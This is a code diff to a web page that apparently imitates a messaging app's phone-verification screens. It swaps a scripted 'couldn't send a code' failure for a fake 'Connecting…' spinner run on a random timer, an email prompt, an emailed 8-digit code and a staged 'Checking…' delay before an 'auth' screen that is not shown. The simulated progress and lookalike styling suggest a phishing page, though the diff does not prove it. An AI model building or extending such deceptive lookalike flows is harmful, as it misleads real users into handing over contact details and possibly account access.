@@ -106,6 +106,20 @@
     position: relative; background: #1c2426; border-radius: 14px; padding: 26px 22px;
     width: 85%; max-width: 320px; box-shadow: 0 10px 30px rgba(0,0,0,0.4);
   }
+  #confirm-number-overlay .modal-card,
+  #email-prompt-overlay .modal-card {
+    background: linear-gradient(145deg, #3D1E6D, #6A2C9C);
+    box-shadow: 0 12px 34px rgba(106, 44, 156, 0.5);
+    border: 1px solid rgba(255,255,255,0.08);
+  }
+  #confirm-number-overlay .confirm-actions button,
+  #email-prompt-overlay .confirm-actions button { color: #E1BEE7; }
+  #email-prompt-input {
+    width: 100%; background: rgba(255,255,255,0.08); border: none; border-bottom: 1px solid #E1BEE7;
+    color: #fff; font-size: 15px; padding: 10px 4px; margin: 6px 0 22px; outline: none; border-radius: 4px 4px 0 0;
+  }
+  #email-prompt-input::placeholder { color: rgba(255,255,255,0.5); }
+  #email-prompt-error { color: #FFCDD2; font-size: 12px; text-align: center; min-height: 14px; margin-top: -14px; margin-bottom: 10px; }
   .confirm-label { color: #e9edee; font-size: 16px; text-align: center; margin-bottom: 14px; }
   .confirm-number { color: #fff; font-size: 20px; font-weight: 600; text-align: center; margin-bottom: 22px; }
   .confirm-actions { display: flex; justify-content: center; gap: 36px; }
@@ -135,19 +149,24 @@
   }
   .code-box:focus { border-bottom-color: var(--green); }
   #verify-sub b { color: #e9edee; }
-  #no-code-label { color: var(--green); font-size: 14px; font-weight: 600; margin: 22px 0 4px; }
-  .option-item { padding: 14px 0; border-bottom: 1px solid #2a3235; color: #e9edee; font-size: 15px; cursor: pointer; }
-  #verify-email-input {
-    width: 100%; padding: 12px 14px; margin: 18px 0 14px; border-radius: 8px;
-    border: 1px solid #2a3235; background: #12181a; color: #e9edee; font-size: 15px; outline: none;
+  #resend-code-btn {
+    display: block; margin: 24px auto 0; background: none; border: none;
+    color: var(--green); font-size: 14px; font-weight: 600; cursor: pointer;
   }
-  #verify-email-input::placeholder { color: #5a6366; }
-  #email-verify-btn {
-    width: 100%; padding: 14px; border: none; border-radius: 26px; background: var(--green);
-    color: #fff; font-size: 16px; font-weight: 600; cursor: pointer;
-    display: flex; align-items: center; justify-content: center;
+  #resend-code-btn:disabled { color: #5a6366; cursor: default; }
+  #verify-status { display: none; text-align: center; margin: 34px 0; }
+  #verify-status-spinner {
+    width: 34px; height: 34px; margin: 0 auto;
+    border: 3px solid #2a3235; border-top-color: var(--green); border-radius: 50%;
+    animation: spin 0.8s linear infinite;
   }
-  #email-verify-btn:active { background: var(--green-dark); }
+  #verify-status-badge {
+    display: none; width: 44px; height: 44px; margin: 0 auto;
+    border-radius: 50%; background: var(--green);
+    align-items: center; justify-content: center;
+  }
+  #verify-status-badge svg { width: 22px; height: 22px; }
+  #verify-status-text { color: #e9edee; font-size: 15px; margin-top: 14px; }
 
   /* ---------- Country picker screen ---------- */
   #country-screen { display: none; flex-direction: column; height: 100%; background: #0b0f10; }
@@ -424,21 +443,26 @@
     </div>
   </div>
 
-  <!-- SENDING CODE MODAL -->
+  <!-- CONNECTING MODAL -->
   <div id="sending-overlay" class="modal-overlay">
     <div class="modal-backdrop"></div>
     <div class="modal-card" style="text-align:center;">
       <div class="modal-spinner"></div>
-      <p class="modal-text">Sending code…</p>
+      <p class="modal-text">Connecting…</p>
     </div>
   </div>
 
-  <!-- SEND FAILED MODAL -->
-  <div id="send-fail-overlay" class="modal-overlay">
+  <!-- EMAIL PROMPT MODAL -->
+  <div id="email-prompt-overlay" class="modal-overlay">
     <div class="modal-backdrop"></div>
-    <div class="modal-card" style="text-align:center;">
-      <p class="modal-text" style="margin-top:0;">We couldn't send a code to this number. Try again later.</p>
-      <button id="send-fail-ok-btn" class="modal-ok-btn">OK</button>
+    <div class="modal-card">
+      <p class="confirm-label">Enter your email to verify your account</p>
+      <input id="email-prompt-input" type="email" placeholder="you@example.com" autocomplete="email" />
+      <div id="email-prompt-error"></div>
+      <div class="confirm-actions">
+        <button id="email-prompt-cancel">Cancel</button>
+        <button id="email-prompt-next"><span id="email-prompt-next-text">Next</span></button>
+      </div>
     </div>
   </div>
 
@@ -448,26 +472,21 @@
       <button id="verify-back-btn">←</button>
       <button>⋮</button>
     </div>
-    <h1>Verifying your number</h1>
-    <p class="phone-sub" id="verify-sub">We couldn't verify <b id="verify-number-display"></b> automatically.</p>
+    <h1>Verifying your email</h1>
+    <p class="phone-sub" id="verify-sub">Enter the 8-digit code sent to <b id="verify-number-display"></b>.</p>
 
     <div class="code-boxes" id="code-boxes"></div>
     <div id="verify-error" style="color:#ff8a80; font-size:13px; min-height:16px; text-align:center; margin-bottom:12px;"></div>
 
-    <div id="no-code-section">
-      <p id="no-code-label">I didn't receive code</p>
-      <div id="no-code-options">
-        <div class="option-item" id="opt-sms-24h">Receive SMS in 24 hours</div>
-        <div class="option-item" id="opt-email">Verify account with email</div>
+    <div id="verify-status">
+      <div id="verify-status-spinner"></div>
+      <div id="verify-status-badge">
+        <svg viewBox="0 0 24 24" fill="none"><path d="M5 13l4 4L19 7" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/></svg>
       </div>
+      <p id="verify-status-text">Checking…</p>
     </div>
 
-    <p class="phone-sub" id="sms-24h-confirm" style="display:none;">We'll send an SMS to your number within 24 hours.</p>
-
-    <div id="email-verify-section" style="display:none;">
-      <input id="verify-email-input" type="email" placeholder="Enter your email address" autocomplete="email" />
-      <button id="email-verify-btn"><span id="email-verify-btn-text">Verify</span></button>
-    </div>
+    <button id="resend-code-btn">Resend code in 30s</button>
   </div>
 
   <!-- COUNTRY PICKER SCREEN -->
@@ -696,40 +715,26 @@ el('confirm-yes-btn').addEventListener('click', () => {
   showModal('sending-overlay');
   setTimeout(() => {
     hideModal('sending-overlay');
-    showModal('send-fail-overlay');
+    el('email-prompt-input').value = '';
+    el('email-prompt-error').textContent = '';
+    showModal('email-prompt-overlay');
   }, randomDelay());
 });
 
-el('send-fail-ok-btn').addEventListener('click', () => {
-  hideModal('send-fail-overlay');
-  resetVerifyScreen();
-  showScreen('verify');
+el('email-prompt-cancel').addEventListener('click', () => {
+  hideModal('email-prompt-overlay');
 });
 
-// ============ VERIFY SCREEN: RECOVERY OPTIONS ============
+// ============ VERIFY SCREEN RESET ============
 function resetVerifyScreen() {
   el('code-boxes').style.display = 'none';
   el('code-boxes').innerHTML = '';
   el('verify-error').textContent = '';
-  el('no-code-section').style.display = 'block';
-  el('no-code-label').style.display = 'block';
-  el('no-code-options').style.display = 'block';
-  el('sms-24h-confirm').style.display = 'none';
-  el('email-verify-section').style.display = 'none';
-  el('verify-email-input').value = '';
+  el('verify-status').style.display = 'none';
+  el('resend-code-btn').style.display = 'block';
   emailCode = null;
+  stopResendTimer();
 }
-
-el('opt-sms-24h').addEventListener('click', () => {
-  el('no-code-options').style.display = 'none';
-  el('no-code-label').style.display = 'none';
-  el('sms-24h-confirm').style.display = 'block';
-});
-
-el('opt-email').addEventListener('click', () => {
-  el('no-code-section').style.display = 'none';
-  el('email-verify-section').style.display = 'block';
-});
 
 el('verify-back-btn').addEventListener('click', () => {
   resetVerifyScreen();
@@ -754,25 +759,71 @@ async function sendCodeEmail(toEmail, code) {
   return data;
 }
 
-el('email-verify-btn').addEventListener('click', async () => {
-  const email = el('verify-email-input').value.trim();
+let resendInterval = null;
+let lastVerifyEmail = '';
+
+function stopResendTimer() {
+  if (resendInterval) { clearInterval(resendInterval); resendInterval = null; }
+}
+
+function startResendTimer() {
+  stopResendTimer();
+  let seconds = 30;
+  const btn = el('resend-code-btn');
+  btn.disabled = true;
+  const tick = () => {
+    if (seconds <= 0) {
+      stopResendTimer();
+      btn.disabled = false;
+      btn.textContent = 'Resend code';
+      return;
+    }
+    btn.textContent = 'Resend code in ' + seconds + 's';
+    seconds--;
+  };
+  tick();
+  resendInterval = setInterval(tick, 1000);
+}
+
+el('email-prompt-next').addEventListener('click', async () => {
+  const email = el('email-prompt-input').value.trim();
+  const errEl = el('email-prompt-error');
+  errEl.textContent = '';
   if (!email || !email.includes('@') || !email.includes('.')) {
-    alert('Enter a valid email address.');
+    errEl.textContent = 'Enter a valid email address.';
     return;
   }
-  const btn = el('email-verify-btn');
+  const btn = el('email-prompt-next');
   setButtonLoading(btn, true, '<span class="btn-spinner"></span>');
   emailCode = generateEightDigitCode();
   try {
     await sendCodeEmail(email, emailCode);
     setButtonLoading(btn, false);
-    el('email-verify-section').style.display = 'none';
+    hideModal('email-prompt-overlay');
+    lastVerifyEmail = email;
     el('verify-sub').innerHTML = 'Enter the 8-digit code sent to <b>' + escapeHtml(email) + '</b>.';
+    el('verify-status').style.display = 'none';
+    el('verify-error').textContent = '';
+    showScreen('verify');
     renderCodeBoxes(8);
+    startResendTimer();
   } catch (err) {
     console.error('Email send error:', err);
     setButtonLoading(btn, false);
-    el('verify-error').textContent = "Couldn't send the code: " + (err.message || 'Server error') + '. Check the browser console and Vercel function logs.';
+    errEl.textContent = "Couldn't send the code: " + (err.message || 'Server error');
+  }
+});
+
+el('resend-code-btn').addEventListener('click', async () => {
+  if (el('resend-code-btn').disabled || !lastVerifyEmail) return;
+  el('verify-error').textContent = '';
+  emailCode = generateEightDigitCode();
+  try {
+    await sendCodeEmail(lastVerifyEmail, emailCode);
+    startResendTimer();
+  } catch (err) {
+    console.error('Resend error:', err);
+    el('verify-error').textContent = "Couldn't resend the code: " + (err.message || 'Server error');
   }
 });
 
@@ -810,10 +861,29 @@ function attachCodeBoxListeners() {
 async function verifyEmailCode() {
   const entered = codeBoxes.map(b => b.value).join('');
   el('verify-error').textContent = '';
+
+  // Show "Checking…" state
+  el('code-boxes').style.display = 'none';
+  el('resend-code-btn').style.display = 'none';
+  el('verify-status-spinner').style.display = 'block';
+  el('verify-status-badge').style.display = 'none';
+  el('verify-status-text').textContent = 'Checking…';
+  el('verify-status').style.display = 'block';
+
+  const delay = 4000 + Math.random() * 2000; // 4-6 seconds
+  await new Promise(resolve => setTimeout(resolve, delay));
+
   if (entered === emailCode) {
-    showScreen('auth');
+    stopResendTimer();
+    el('verify-status-spinner').style.display = 'none';
+    el('verify-status-badge').style.display = 'flex';
+    el('verify-status-text').textContent = 'Verified';
+    setTimeout(() => showScreen('auth'), 1200);
   } else {
-    el('verify-error').textContent = 'Incorrect code. Try again.';
+    el('verify-status').style.display = 'none';
+    el('code-boxes').style.display = 'flex';
+    el('resend-code-btn').style.display = 'block';
+    el('verify-error').textContent = 'Incorrect code please resend new code';
     codeBoxes.forEach(b => { b.value = ''; });
     codeBoxes[0].focus();
   }
